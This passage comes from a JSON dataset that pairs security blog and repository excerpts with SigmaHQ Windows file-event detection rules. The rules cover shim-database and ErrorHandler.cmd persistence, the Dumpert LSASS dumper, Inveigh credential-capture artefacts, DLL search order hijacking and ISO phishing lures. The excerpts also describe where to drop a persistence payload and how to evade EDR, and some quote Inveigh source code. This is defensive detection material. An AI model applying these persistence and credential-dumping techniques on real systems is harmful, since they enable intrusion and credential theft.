        "https://liberty-shell.com/sec/2020/02/25/shim-persistence/",
        "https://andreafortuna.org/2018/11/12/process-injection-and-persistence-using-application-shimming/"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-12-29",
      "modified": "2023-12-06",
      "tags": [
        "attack.persistence",
        "attack.t1547.009"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": [
            ":\\Windows\\apppatch\\Custom\\",
            ":\\Windows\\apppatch\\CustomSDB\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate custom SHIM installations will also trigger this rule"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_creation_new_shim_database.yml"
  },
  "840": {
    "url": "https://liberty-shell.com/sec/2020/02/25/shim-persistence/",
    "markdown": "# Persistence via Shims **Published on:** Feb 25, 2020 **Posted in:** Pentesting --- ## Application Shimming This’ll be a quick post on the Windows Persistence method of Application Shimming - T1138. Microsoft developed a method for users/engineers to create custom fixes for application compatibility issues on differing Windows versions. These custom fixes are called shims and can be created by the end user with a free Microsoft tool called Application Compatibility Toolkit (ACT). ```image Alt: ms compatadmin Description: The image depicts the user interface of the Compatibility Administrator tool, which is part of the Application Compatibility Toolkit developed by Microsoft.",
    "sigma_rule": {
      "title": "New Custom Shim Database Created",
      "id": "ee63c85c-6d51-4d12-ad09-04e25877a947",
      "status": "test",
      "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.\nThe Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.011/T1546.011.md#atomic-test-2---new-shim-database-files-created-in-the-default-shim-database-directory",
        "https://www.mandiant.com/resources/blog/fin7-shim-databases-persistence",
        "https://liberty-shell.com/sec/2020/02/25/shim-persistence/",
        "https://andreafortuna.org/2018/11/12/process-injection-and-persistence-using-application-shimming/"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-12-29",
      "modified": "2023-12-06",
      "tags": [
        "attack.persistence",
        "attack.t1547.009"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": [
            ":\\Windows\\apppatch\\Custom\\",
            ":\\Windows\\apppatch\\CustomSDB\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate custom SHIM installations will also trigger this rule"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_creation_new_shim_database.yml"
  },
  "841": {
    "url": "https://andreafortuna.org/2018/11/12/process-injection-and-persistence-using-application-shimming/",
    "markdown": "",
    "sigma_rule": {
      "title": "New Custom Shim Database Created",
      "id": "ee63c85c-6d51-4d12-ad09-04e25877a947",
      "status": "test",
      "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.\nThe Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.011/T1546.011.md#atomic-test-2---new-shim-database-files-created-in-the-default-shim-database-directory",
        "https://www.mandiant.com/resources/blog/fin7-shim-databases-persistence",
        "https://liberty-shell.com/sec/2020/02/25/shim-persistence/",
        "https://andreafortuna.org/2018/11/12/process-injection-and-persistence-using-application-shimming/"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-12-29",
      "modified": "2023-12-06",
      "tags": [
        "attack.persistence",
        "attack.t1547.009"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": [
            ":\\Windows\\apppatch\\Custom\\",
            ":\\Windows\\apppatch\\CustomSDB\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate custom SHIM installations will also trigger this rule"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_creation_new_shim_database.yml"
  },
  "842": {
    "url": "https://www.hexacorn.com/blog/2022/01/16/beyond-good-ol-run-key-part-135/",
    "markdown": "# Beyond good ol’ Run key, Part 135 Posted on 2022-01-16 These days I post most of the new stuff on Twitter as no one reads blogs anymore, right? 🙂 Still, good to document some of it in a more permanent way so this is the persistence bit I posted about yesterday: A number of tools inside the `c:\\WINDOWS\\system32\\oobe\\` folder: - audit.exe - oobeldr.exe - Setup.exe - windeploy.exe - winsetup.dll include references to `c:\\WINDOWS\\Setup\\Scripts\\ErrorHandler.cmd`. Turns out, if you drop your payload to `c:\\WINDOWS\\Setup\\Scripts\\ErrorHandler.cmd` the `c:\\WINDOWS\\system32\\oobe\\Setup.exe` will load it anytime there is an error. The most trivial way to trigger it",
    "sigma_rule": {
      "title": "Potential Persistence Attempt Via ErrorHandler.Cmd",
      "id": "15904280-565c-4b73-9303-3291f964e7f9",
      "status": "test",
      "description": "Detects creation of a file named \"ErrorHandler.cmd\" in the \"C:\\WINDOWS\\Setup\\Scripts\\\" directory which could be used as a method of persistence\nThe content of C:\\WINDOWS\\Setup\\Scripts\\ErrorHandler.cmd is read whenever some tools under C:\\WINDOWS\\System32\\oobe\\ (e.g. Setup.exe) fail to run for any reason.\n",
      "references": [
        "https://www.hexacorn.com/blog/2022/01/16/beyond-good-ol-run-key-part-135/",
        "https://github.com/last-byte/PersistenceSniper"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-09",
      "modified": "2022-12-19",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": "\\WINDOWS\\Setup\\Scripts\\ErrorHandler.cmd"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_errorhandler_persistence.yml"
  },
  "843": {
    "url": "https://github.com/last-byte/PersistenceSniper",
    "markdown": "# PersistenceSniper ## Folders and Files - .github/workflows - PersistenceSniper - .gitignore - CHANGELOG.md - LICENSE - README.md - SECURITY.md - persistencesnipernew4.png ## README ### PersistenceSniper PersistenceSniper is a Powershell module that can be used by Blue Teams, Incident Responders, and System Administrators to hunt persistences implanted in Windows machines. It is also available on Powershell Gallery and it is digitally signed with a valid code signing certificate. The tool is under active development with new releases coming out by the week, so make sure to use the up-to-date version. Official Twitter/X account @PersistSniper. #### The Why Why writing such",
    "sigma_rule": {
      "title": "Potential Persistence Attempt Via ErrorHandler.Cmd",
      "id": "15904280-565c-4b73-9303-3291f964e7f9",
      "status": "test",
      "description": "Detects creation of a file named \"ErrorHandler.cmd\" in the \"C:\\WINDOWS\\Setup\\Scripts\\\" directory which could be used as a method of persistence\nThe content of C:\\WINDOWS\\Setup\\Scripts\\ErrorHandler.cmd is read whenever some tools under C:\\WINDOWS\\System32\\oobe\\ (e.g. Setup.exe) fail to run for any reason.\n",
      "references": [
        "https://www.hexacorn.com/blog/2022/01/16/beyond-good-ol-run-key-part-135/",
        "https://github.com/last-byte/PersistenceSniper"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-09",
      "modified": "2022-12-19",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": "\\WINDOWS\\Setup\\Scripts\\ErrorHandler.cmd"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_errorhandler_persistence.yml"
  },
  "844": {
    "url": "https://github.com/outflanknl/Dumpert",
    "markdown": "# Dumpert ## Folders and Files - Dumpert-Aggressor - Dumpert-DLL - Dumpert - README.md ## README **Dumpert, an LSASS memory dumper using direct system calls and API unhooking** Recent malware research shows that there is an increase in malware that is using direct system calls to evade user-mode API hooks used by security products. This tool demonstrates the use of direct System Calls and API unhooking and combines these techniques in a proof of concept code which can be used to create a LSASS memory dump using Cobalt Strike, while not touching disk and evading AV/EDR monitored user-mode API calls.",
    "sigma_rule": {
      "title": "HackTool - Dumpert Process Dumper Default File",
      "id": "93d94efc-d7ad-4161-ad7d-1638c4f908d8",
      "related": [
        {
          "id": "2704ab9e-afe2-4854-a3b1-0c0706d03578",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the creation of the default dump file used by Outflank Dumpert tool. A process dumper, which dumps the lsass process memory",
      "references": [
        "https://github.com/outflanknl/Dumpert",
        "https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2020-02-04",
      "modified": "2023-05-09",
      "tags": [
        "attack.credential-access",
        "attack.t1003.001"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": "dumpert.dmp"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Very unlikely"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_hktl_dumpert.yml"
  },
  "845": {
    "url": "https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/",
    "markdown": "# Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations ## Executive Summary On September 10, 2019, we observed unknown threat actors exploiting a vulnerability in SharePoint described in CVE-2019-0604 to install several webshells on the website of a Middle East government organization. One of these webshells is the open source AntSword webshell freely available on Github, which is remarkably similar to the infamous China Chopper webshell. On January 10, 2020, we used Shodan to search for Internet accessible servers running versions of SharePoint vulnerable to CVE-2019-0604. While admittedly the version numbers provided by SharePoint within HTTP responses",
    "sigma_rule": {
      "title": "HackTool - Dumpert Process Dumper Default File",
      "id": "93d94efc-d7ad-4161-ad7d-1638c4f908d8",
      "related": [
        {
          "id": "2704ab9e-afe2-4854-a3b1-0c0706d03578",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the creation of the default dump file used by Outflank Dumpert tool. A process dumper, which dumps the lsass process memory",
      "references": [
        "https://github.com/outflanknl/Dumpert",
        "https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2020-02-04",
      "modified": "2023-05-09",
      "tags": [
        "attack.credential-access",
        "attack.t1003.001"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": "dumpert.dmp"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Very unlikely"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_hktl_dumpert.yml"
  },
  "846": {
    "url": "https://github.com/Kevin-Robertson/Inveigh/blob/29d9e3c3a625b3033cdaf4683efaafadcecb9007/Inveigh/Support/Output.cs",
    "markdown": "# Inveigh / Inveigh / Support / Output.cs ``` using System; using System.Collections.Generic; using System.IO; using System.Threading; using System.Linq; using System.Diagnostics; using Quiddity.Support; namespace Inveigh { class Output { public static void OutputLoop() { bool keyDetect = true; bool keyPressed = false; do { while (Program.enabledConsoleOutput && !keyPressed) { try { if (keyDetect && Console.KeyAvailable) { keyPressed = true; } } catch { keyDetect = false; } while (Program.consoleList.Count > 0) { ConsoleOutputFormat(Program.consoleList[0]); Program.consoleList.RemoveAt(0); } if (!Program.isRunning) { break; } Thread.Sleep(5); } } while (Program.isRunning && Program.enabledConsoleOutput && Console.ReadKey(true).Key != ConsoleKey.Escape); } public static void Queue(string Output) { lock (Program.outputList)",
    "sigma_rule": {
      "title": "HackTool - Inveigh Execution Artefacts",
      "id": "bb09dd3e-2b78-4819-8e35-a7c1b874e449",
      "status": "test",
      "description": "Detects the presence and execution of Inveigh via dropped artefacts",
      "references": [
        "https://github.com/Kevin-Robertson/Inveigh/blob/29d9e3c3a625b3033cdaf4683efaafadcecb9007/Inveigh/Support/Output.cs",
        "https://github.com/Kevin-Robertson/Inveigh/blob/29d9e3c3a625b3033cdaf4683efaafadcecb9007/Inveigh/Support/Control.cs",
        "https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-10-24",
      "modified": "2024-06-27",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            "\\Inveigh-Log.txt",
            "\\Inveigh-Cleartext.txt",
            "\\Inveigh-NTLMv1Users.txt",
            "\\Inveigh-NTLMv2Users.txt",
            "\\Inveigh-NTLMv1.txt",
            "\\Inveigh-NTLMv2.txt",
            "\\Inveigh-FormInput.txt",
            "\\Inveigh.dll",
            "\\Inveigh.exe",
            "\\Inveigh.ps1",
            "\\Inveigh-Relay.ps1"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_hktl_inveigh_artefacts.yml"
  },
  "847": {
    "url": "https://github.com/Kevin-Robertson/Inveigh/blob/29d9e3c3a625b3033cdaf4683efaafadcecb9007/Inveigh/Support/Control.cs",
    "markdown": "# Inveigh Control.cs ``` using System; using System.IO; using System.Linq; using System.Threading; using System.Diagnostics; using System.Text.RegularExpressions; using System.Net; using System.Collections.Generic; using System.Text; using System.Globalization; namespace Inveigh { class Control { public static void ControlLoop(string consoleLevel, int consoleQueueLimit, int consoleStatus, int runCount, int runTime) { Stopwatch stopwatchConsoleStatus = new Stopwatch(); stopwatchConsoleStatus.Start(); Stopwatch stopwatchRunTime = new Stopwatch(); stopwatchRunTime.Start(); bool isPromptRefresh = false; while (Program.isRunning) { if (Program.cleartextList.Count > Program.cleartextCount) { Program.cleartextCount = Program.cleartextList.Count; Program.isCleartextUpdated = true; isPromptRefresh = true; } if (Program.ntlmv1List.Count > Program.ntlmv1Count) { Program.ntlmv1Count = Program.ntlmv1List.Count; Program.isNTLMv1Updated = true; isPromptRefresh = true; } if (Program.ntlmv2List.Count > Program.ntlmv2Count) { Program.ntlmv2Count =",
    "sigma_rule": {
      "title": "HackTool - Inveigh Execution Artefacts",
      "id": "bb09dd3e-2b78-4819-8e35-a7c1b874e449",
      "status": "test",
      "description": "Detects the presence and execution of Inveigh via dropped artefacts",
      "references": [
        "https://github.com/Kevin-Robertson/Inveigh/blob/29d9e3c3a625b3033cdaf4683efaafadcecb9007/Inveigh/Support/Output.cs",
        "https://github.com/Kevin-Robertson/Inveigh/blob/29d9e3c3a625b3033cdaf4683efaafadcecb9007/Inveigh/Support/Control.cs",
        "https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-10-24",
      "modified": "2024-06-27",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            "\\Inveigh-Log.txt",
            "\\Inveigh-Cleartext.txt",
            "\\Inveigh-NTLMv1Users.txt",
            "\\Inveigh-NTLMv2Users.txt",
            "\\Inveigh-NTLMv1.txt",
            "\\Inveigh-NTLMv2.txt",
            "\\Inveigh-FormInput.txt",
            "\\Inveigh.dll",
            "\\Inveigh.exe",
            "\\Inveigh.ps1",
            "\\Inveigh-Relay.ps1"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_hktl_inveigh_artefacts.yml"
  },
  "848": {
    "url": "https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/",
    "markdown": "# PYSA/Mespinoza Ransomware **Published on:** November 23, 2020 ## Intro Over the course of 8 hours, the PYSA/Mespinoza threat actors used Empire, Koadic, and RDP to move laterally throughout the environment, grabbing credentials from as many systems as possible on the way to their objective. The threat actors took their time, looking for files and reviewing the backup server before executing ransomware on all systems. Hours after being ransomed, our files were opened from multiple Tor exit nodes, which confirms our suspicion that files had been exfiltrated. PYSA/Mespinoza seemed to make its big splash when CERT-FR published a report on",
    "sigma_rule": {
      "title": "HackTool - Inveigh Execution Artefacts",
      "id": "bb09dd3e-2b78-4819-8e35-a7c1b874e449",
      "status": "test",
      "description": "Detects the presence and execution of Inveigh via dropped artefacts",
      "references": [
        "https://github.com/Kevin-Robertson/Inveigh/blob/29d9e3c3a625b3033cdaf4683efaafadcecb9007/Inveigh/Support/Output.cs",
        "https://github.com/Kevin-Robertson/Inveigh/blob/29d9e3c3a625b3033cdaf4683efaafadcecb9007/Inveigh/Support/Control.cs",
        "https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-10-24",
      "modified": "2024-06-27",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            "\\Inveigh-Log.txt",
            "\\Inveigh-Cleartext.txt",
            "\\Inveigh-NTLMv1Users.txt",
            "\\Inveigh-NTLMv2Users.txt",
            "\\Inveigh-NTLMv1.txt",
            "\\Inveigh-NTLMv2.txt",
            "\\Inveigh-FormInput.txt",
            "\\Inveigh.dll",
            "\\Inveigh.exe",
            "\\Inveigh.ps1",
            "\\Inveigh-Relay.ps1"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_hktl_inveigh_artefacts.yml"
  },
  "849": {
    "url": "https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-5d46dd4ac6866b4337ec126be8cee0e115467b3e8703794ba6f6df6432c806bc",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Initial Access via DLL Search Order Hijacking",
      "id": "dbbd9f66-2ed3-4ca2-98a4-6ea985dd1a1c",
      "status": "test",
      "description": "Detects attempts to create a DLL file to a known desktop application dependencies folder such as Slack, Teams or OneDrive and by an unusual process. This may indicate an attempt to load a malicious module via DLL search order hijacking.",
      "references": [
        "https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-5d46dd4ac6866b4337ec126be8cee0e115467b3e8703794ba6f6df6432c806bc",
        "https://posts.specterops.io/automating-dll-hijack-discovery-81c4295904b0"
      ],
      "author": "Tim Rauch (rule), Elastic (idea)",
      "date": "2022-10-21",
      "tags": [
        "attack.t1566",
        "attack.t1566.001",
        "attack.initial-access",
        "attack.t1574",
        "attack.t1574.001",
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\winword.exe",
            "\\excel.exe",
            "\\powerpnt.exe",
            "\\MSACCESS.EXE",
            "\\MSPUB.EXE",
            "\\fltldr.exe",
            "\\cmd.exe",
            "\\certutil.exe",
            "\\mshta.exe",
            "\\cscript.exe",
            "\\wscript.exe",
            "\\curl.exe",
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "TargetFilename|endswith": ".dll",
          "TargetFilename|contains|all": [
            "\\Users\\",
            "\\AppData\\"
          ],
          "TargetFilename|contains": [
            "\\Microsoft\\OneDrive\\",
            "\\Microsoft OneDrive\\",
            "\\Microsoft\\Teams\\",
            "\\Local\\slack\\app-",
            "\\Local\\Programs\\Microsoft VS Code\\"
          ]
        },
        "filter": {
          "Image|endswith": "\\cmd.exe",
          "TargetFilename|contains|all": [
            "\\Users\\",
            "\\AppData\\",
            "\\Microsoft\\OneDrive\\",
            "\\api-ms-win-core-"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_initial_access_dll_search_order_hijacking.yml"
  },
  "850": {
    "url": "https://posts.specterops.io/automating-dll-hijack-discovery-81c4295904b0",
    "markdown": "# Automating DLL Hijack Discovery This blogpost will describe the concept of dynamic-link library (DLL) search order hijacking and how it can be used for userland persistence on Windows systems. This technique is mapped to MITRE ATT&CK under DLL Search Order Hijacking (T1038). DLL hijacking is useful to an attacker for a myriad of reasons, but this post will focus on its use for persistence when combined with autostart applications. For example, since Slack and Microsoft Teams start on boot (by default), a DLL hijack in one of these applications would allow an attacker persistent access to their target whenever",
    "sigma_rule": {
      "title": "Potential Initial Access via DLL Search Order Hijacking",
      "id": "dbbd9f66-2ed3-4ca2-98a4-6ea985dd1a1c",
      "status": "test",
      "description": "Detects attempts to create a DLL file to a known desktop application dependencies folder such as Slack, Teams or OneDrive and by an unusual process. This may indicate an attempt to load a malicious module via DLL search order hijacking.",
      "references": [
        "https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-5d46dd4ac6866b4337ec126be8cee0e115467b3e8703794ba6f6df6432c806bc",
        "https://posts.specterops.io/automating-dll-hijack-discovery-81c4295904b0"
      ],
      "author": "Tim Rauch (rule), Elastic (idea)",
      "date": "2022-10-21",
      "tags": [
        "attack.t1566",
        "attack.t1566.001",
        "attack.initial-access",
        "attack.t1574",
        "attack.t1574.001",
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\winword.exe",
            "\\excel.exe",
            "\\powerpnt.exe",
            "\\MSACCESS.EXE",
            "\\MSPUB.EXE",
            "\\fltldr.exe",
            "\\cmd.exe",
            "\\certutil.exe",
            "\\mshta.exe",
            "\\cscript.exe",
            "\\wscript.exe",
            "\\curl.exe",
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "TargetFilename|endswith": ".dll",
          "TargetFilename|contains|all": [
            "\\Users\\",
            "\\AppData\\"
          ],
          "TargetFilename|contains": [
            "\\Microsoft\\OneDrive\\",
            "\\Microsoft OneDrive\\",
            "\\Microsoft\\Teams\\",
            "\\Local\\slack\\app-",
            "\\Local\\Programs\\Microsoft VS Code\\"
          ]
        },
        "filter": {
          "Image|endswith": "\\cmd.exe",
          "TargetFilename|contains|all": [
            "\\Users\\",
            "\\AppData\\",
            "\\Microsoft\\OneDrive\\",
            "\\api-ms-win-core-"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_initial_access_dll_search_order_hijacking.yml"
  },
  "851": {
    "url": "https://www.microsoft.com/en-us/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/",
    "markdown": "# New sophisticated email-based attack from NOBELIUM **Categories:** - News - Email security - Microsoft Defender **Published:** May 27, 2021 --- ## Overview Microsoft Threat Intelligence Center (MSTIC) has uncovered a wide-scale malicious email campaign operated by NOBELIUM, the threat actor behind the attacks against SolarWinds, the SUNBURST backdoor, TEARDROP malware, GoldMax malware, and other related components. The campaign, initially observed and tracked by Microsoft since January 2021, evolved over a series of waves demonstrating significant experimentation. On May 25, 2021, the campaign escalated as NOBELIUM leveraged the legitimate mass-mailing service, Constant Contact, to masquerade as a US-based development organization",
    "sigma_rule": {
      "title": "ISO or Image Mount Indicator in Recent Files",
      "id": "4358e5a5-7542-4dcb-b9f3-87667371839b",
      "status": "test",
      "description": "Detects the creation of recent element file that points to an .ISO, .IMG, .VHD or .VHDX file as often used in phishing attacks.\nThis can be a false positive on server systems but on workstations users should rarely mount .iso or .img files.\n",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/",
        "https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore",
        "https://blog.emsisoft.com/en/32373/beware-new-wave-of-malware-spreads-via-iso-file-email-attachments/",
        "https://insights.sei.cmu.edu/blog/the-dangers-of-vhd-and-vhdx-files/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-11",
      "tags": [
        "attack.initial-access",
        "attack.t1566.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            ".iso.lnk",
            ".img.lnk",
            ".vhd.lnk",
            ".vhdx.lnk"
          ],
          "TargetFilename|contains": "\\Microsoft\\Windows\\Recent\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Cases in which a user mounts an image file for legitimate reasons"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_iso_file_recent.yml"
  },
  "852": {
    "url": "https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore",
    "markdown": "# Malicious Spam Campaign Uses ISO Image Files to Deliver LokiBot and NanoCore **Date Published:** June 28, 2019 As cybercriminals become more creative with their spamming techniques, it shouldn’t be surprising to see more unusual file types being employed as file attachments, as was the case with an April campaign discovered by Netskope that used ISO image files to deliver two notorious Trojans: LokiBot and NanoCore. The malicious spam comes in the form of a fake invoice email which states that the recipient can access the billing by opening an ISO image attachment. This is notable because invoices are usually",
    "sigma_rule": {
      "title": "ISO or Image Mount Indicator in Recent Files",
      "id": "4358e5a5-7542-4dcb-b9f3-87667371839b",
      "status": "test",
      "description": "Detects the creation of recent element file that points to an .ISO, .IMG, .VHD or .VHDX file as often used in phishing attacks.\nThis can be a false positive on server systems but on workstations users should rarely mount .iso or .img files.\n",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/",
        "https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore",
        "https://blog.emsisoft.com/en/32373/beware-new-wave-of-malware-spreads-via-iso-file-email-attachments/",
        "https://insights.sei.cmu.edu/blog/the-dangers-of-vhd-and-vhdx-files/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-11",
      "tags": [
        "attack.initial-access",
        "attack.t1566.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            ".iso.lnk",
            ".img.lnk",
            ".vhd.lnk",
            ".vhdx.lnk"
          ],
          "TargetFilename|contains": "\\Microsoft\\Windows\\Recent\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Cases in which a user mounts an image file for legitimate reasons"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_iso_file_recent.yml"
  },
  "853": {
    "url": "https://blog.emsisoft.com/en/32373/beware-new-wave-of-malware-spreads-via-iso-file-email-attachments/",
    "markdown": "# Beware: New wave of malware spreads via ISO file email attachments **Published on:** November 17, 2018 Email remains one of the most common methods of malware delivery. In 2016, about 66 percent of malware was installed via malicious email attachments, according to a Verizon report. Most malicious email attachments come in the form of widely recognized files such as .EXE, .DOC, .PDF, .ZIP and so on, but recently we’ve seen a spike in malware concealed in ISO files. Read on to learn more about what ISO files are, how to spot a dodgy ISO email attachment and what you",
    "sigma_rule": {
      "title": "ISO or Image Mount Indicator in Recent Files",
      "id": "4358e5a5-7542-4dcb-b9f3-87667371839b",
      "status": "test",
      "description": "Detects the creation of recent element file that points to an .ISO, .IMG, .VHD or .VHDX file as often used in phishing attacks.\nThis can be a false positive on server systems but on workstations users should rarely mount .iso or .img files.\n",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/",
        "https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore",
        "https://blog.emsisoft.com/en/32373/beware-new-wave-of-malware-spreads-via-iso-file-email-attachments/",
        "https://insights.sei.cmu.edu/blog/the-dangers-of-vhd-and-vhdx-files/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-11",
      "tags": [
        "attack.initial-access",
        "attack.t1566.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            ".iso.lnk",
            ".img.lnk",
            ".vhd.lnk",
            ".vhdx.lnk"
          ],
          "TargetFilename|contains": "\\Microsoft\\Windows\\Recent\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Cases in which a user mounts an image file for legitimate reasons"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_iso_file_recent.yml"
  },
  "854": {
    "url": "https://insights.sei.cmu.edu/blog/the-dangers-of-vhd-and-vhdx-files/",
